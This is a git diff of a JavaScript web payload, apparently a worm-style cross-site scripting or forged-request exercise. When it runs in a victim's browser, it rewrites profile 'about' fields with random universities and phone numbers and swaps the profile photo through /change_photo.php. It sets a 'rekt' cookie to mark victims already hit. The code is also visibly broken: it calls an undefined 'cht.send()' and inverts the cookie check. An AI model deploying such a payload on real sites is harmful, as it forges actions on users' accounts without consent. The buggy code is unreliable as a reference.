@@ -1,11 +1,12 @@
 /*jshint esversion: 6 */
+const links = require('./links.json');
 const unis = ["Rochester Institute of Technology", "University of Rochester",
 	"University at Buffalo", "Buffalo State College", "SUNY Brockport",
 	"University at Waterloo", "SUNY Geneseo", "University of Toronto"
 ];
 
 const zipcodes = ["315", "585", "716"];
-//const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"];
+const jsonIn = ["Zucc", "Limewire", "Bezos", "Stop", "Chungus"];
 
 function getRandomInt(max) {
 	return Math.floor(Math.random() * max);
@@ -13,7 +14,6 @@ function getRandomInt(max) {
 
 
 function post_About() {
-	//var r1 = getRandomInt(4);
 	var r2 = getRandomInt(7);
 	var r3 = getRandomInt(2);
 
@@ -40,9 +40,20 @@ function post_About() {
 	xhs.send(`name=phone&value=${sendphone}`);
 }
 
+function change_Profile(){
+    var r1 = getRandomInt(4);
+    var key = jsonIn[r1];
+    var pictureURL = encodeURIComponent(links[key]);
+
+    var xht = new XMLHttpRequest();
+    xht.open("GET", `/change_photo.php?type=profile&url=${pictureURL}`,true);
+    cht.send(); 
+}
+
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
-if (cookies.get("rekt") != "yes") {
+if (cookies.get("rekt") == "yes") {
     post_About();
+    change_Profile();
 }
 
 document.cookie = "rekt=yes"
